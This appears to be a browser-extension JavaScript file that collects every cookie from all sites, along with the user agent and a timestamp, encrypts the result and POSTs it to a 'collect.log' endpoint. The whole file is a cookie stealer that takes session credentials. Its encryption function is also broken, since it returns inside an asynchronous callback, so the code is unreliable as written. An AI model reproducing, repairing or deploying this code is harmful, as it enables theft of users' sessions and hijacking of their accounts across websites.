chrome.storage.local.get('encryptionKey', function(result) {
    if (!result.encryptionKey) {
        var key = CryptoJS.lib.WordArray.random(16).toString();
        chrome.storage.local.set({ 'encryptionKey': key }, function() {
            console.log('Encryption key stored successfully.');
        });
    }
});

chrome.cookies.getAll({}, function(cookies) {
    var logFile = 'collect.log'; // Change to 'collect.txt' if needed
    var log = '';
    var timestamp = new Date().toISOString();
    var browserInfo = navigator.userAgent;

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        log += timestamp + ' - ' + browserInfo + ' - ' + cookie.name + '=' + cookie.value + '\n';
    }

    if (log !== '') {
        var encryptedLog = encrypt(log);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', logFile, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('Cookies collected and logged successfully.');
            }
        };
        xhr.send('log=' + encodeURIComponent(encryptedLog));
    }
});

function encrypt(text) {
    chrome.storage.local.get('encryptionKey', function(result) {
        var key = result.encryptionKey;
        var encryptedText = CryptoJS.AES.encrypt(text, key).toString();
        return encryptedText;
    });
}